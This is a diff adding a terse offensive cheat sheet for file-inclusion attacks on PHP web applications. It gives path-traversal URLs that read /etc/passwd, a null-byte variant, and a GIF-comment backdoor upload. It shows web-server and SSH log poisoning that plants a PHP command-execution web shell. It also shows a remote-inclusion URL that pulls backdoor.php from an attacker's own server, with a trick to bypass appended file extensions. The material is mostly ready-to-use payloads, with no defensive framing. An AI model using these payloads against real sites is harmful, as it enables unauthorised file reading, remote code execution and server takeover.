@@ -1,0 +1,62 @@
+					LFI
+					===
+			
+LFI:
+http://targetserver.com/load.php?page=../../../../../etc/passwd
+
+LFT-NullByte:
+http://targetserver.com/load.php?page=../../../../../etc/passwd%00
+
+
+LFI to RCE:
+
+-Add The backdoor to The comment section of gif file.
+-Upload The file to the target server.
+-With the help of local File inclusion load The file for The server and it will be executed as php.
+-Now Execute your own commands.
+
+LFI to XSS with log Posioning :
+
+-Find LFI
+-nc server.com 80
+-send the request directly "><script>alert(0);</script>
+-visit the access_log from the browser
+
+LFI to Backdoor using Log Poisioning
+
+-Find LFI
+-nc Targetserver.com 80
+-send the request directly <?php  echo system($_GET['cmd']); exit; ?>
+-visit the url http://targetserver.com/load.php?file=../../opt/lampp/logs/access_log&cmd=ls
+-and execute the commands
+
+LFI to Backdoor using ssh Log Poisioning
+
+-Find LFI
+-ssh '<?php  echo system($_GET['cmd']); exit; ?>'@192.168.43.1
+-Visit http://targetserver.com/load.php?file=../../var/log/auth.log&cmd=ls
+-and execute the commands
+
+				RFI:
+				====
+
+
+
+RFI:
+http://server.com/page.php?load=http://myserve.com/backdoor.php
+
+
+Forced Extension:
+----------------
+In this case The server Appends The Extension at the end of the file
+Eg:
+	Appended Extension:.html
+	http://server.com/page.php?load=http://myserve.com/backdoor.php
+	The Server Loads backdoor.php.html which is not found on the server
+	and the backdoor is not loaded
+
+	The Trick:
+	if The server is Appending .html at the last and requests for 
+	backdoor.php.html. to Bypass This file we can simply rename our
+	backdoor as backdoor.php.html on the localserver and will make an
+	request for it.
